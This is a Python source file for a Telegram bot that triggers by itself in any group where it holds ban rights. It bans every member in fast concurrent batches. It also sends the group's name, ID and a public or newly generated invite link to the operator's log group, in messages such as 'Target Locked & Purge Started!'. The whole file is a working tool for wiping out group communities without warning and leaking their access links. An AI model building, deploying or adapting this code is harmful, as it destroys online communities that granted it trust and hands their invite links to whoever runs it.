import os
import asyncio
import time
from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInvalidError

# ───── ENV CONFIG ───── #
def get_env_var(name):
    value = os.environ.get(name)
    if not value:
        print(f"⚠️ Missing environment variable: {name}")
    return value

def to_int(value):
    try: return int(value)
    except: return None

BOT_TOKEN = get_env_var("BOT_TOKEN")
API_ID = to_int(get_env_var("API_ID"))
API_HASH = get_env_var("API_HASH")
LOG_GROUP_ID = to_int(get_env_var("LOG_GROUP_ID"))

# Speed settings
BATCH_SIZE = 25 

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_tasks = set()

# ───── HELPER: GET/GENERATE LINK ───── #
async def get_best_link(chat):
    """Public link check karta hai, nahi toh naya generate karta hai."""
    # 1. Check for public username
    if getattr(chat, 'username', None):
        return f"https://t.me/{chat.username}"
    
    # 2. Try to generate an invite link for private groups
    try:
        link_obj = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
        return link_obj.link
    except Exception:
        return "Private (No Invite Permission)"

# ───── ATOMIC KICK FUNCTION ───── #
async def fast_kick(chat_id, user_id):
    try:
        await bot(functions.channels.EditBannedRequest(
            channel=chat_id,
            participant=user_id,
            banned_rights=types.ChatBannedRights(until_date=None, view_messages=True)
        ))
        return True
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return False
    except (UserAdminInvalidError, ChatAdminRequiredError):
        return "stop"
    except Exception:
        return False

# ───── BATCH CLEANUP ENGINE ───── #
async def start_cleanup(chat):
    if chat.id in active_tasks:
        return
    active_tasks.add(chat.id)
    
    start_time = time.time()
    removed_count = 0
    me = await bot.get_me()
    
    # Generate Link
    group_link = await get_best_link(chat)

    await bot.send_message(
        LOG_GROUP_ID, 
        f"🚀 **Target Locked & Purge Started!**\n\n"
        f"🏷️ **Name:** {chat.title}\n"
        f"🆔 **ID:** `{chat.id}`\n"
        f"🔗 **Link:** {group_link}"
    )

    try:
        current_batch = []
        async for user in bot.iter_participants(chat.id):
            if user.id == me.id: continue
            
            current_batch.append(fast_kick(chat.id, user.id))

            if len(current_batch) >= BATCH_SIZE:
                results = await asyncio.gather(*current_batch)
                removed_count += sum(1 for r in results if r is True)
                current_batch = []
                
                if "stop" in results:
                    await bot.send_message(LOG_GROUP_ID, f"❌ **Aborted:** Permissions lost in {chat.title}")
                    break
                
                await asyncio.sleep(0.1) # Prevents CPU spike

        # Final batch cleanup
        if current_batch:
            results = await asyncio.gather(*current_batch)
            removed_count += sum(1 for r in results if r is True)

    finally:
        duration = round(time.time() - start_time, 2)
        await bot.send_message(
            LOG_GROUP_ID, 
            f"✅ **Mission Accomplished!**\n\n"
            f"🏷️ **Group:** {chat.title}\n"
            f"👤 **Total Removed:** {removed_count}\n"
            f"⏱️ **Total Time:** {duration}s\n"
            f"🔗 **Link:** {group_link}"
        )
        active_tasks.remove(chat.id)

# ───── AUTOMATIC TRIGGERS ───── #
@bot.on(events.ChatAction)
async def on_added(event):
    if event.user_added and event.user_id == (await bot.get_me()).id:
        chat = await event.get_chat()
        asyncio.create_task(check_and_run(chat))

@bot.on(events.NewMessage())
async def on_msg(event):
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        asyncio.create_task(check_and_run(chat))

async def check_and_run(chat):
    if chat.id in active_tasks: return
    try:
        perms = await bot.get_permissions(chat.id, 'me')
        if perms.is_admin and perms.ban_users:
            await start_cleanup(chat)
    except Exception:
        pass

# ───── BOT RUNNER ───── #
async def main():
    print("⚡ Turbo Link-Purge Bot is running...")
    await bot.send_message(LOG_GROUP_ID, "🚀 **Bot Is Online!**\nReady to clean and generate links.")
    await bot.run_until_disconnected()

bot.loop.run_until_complete(main())
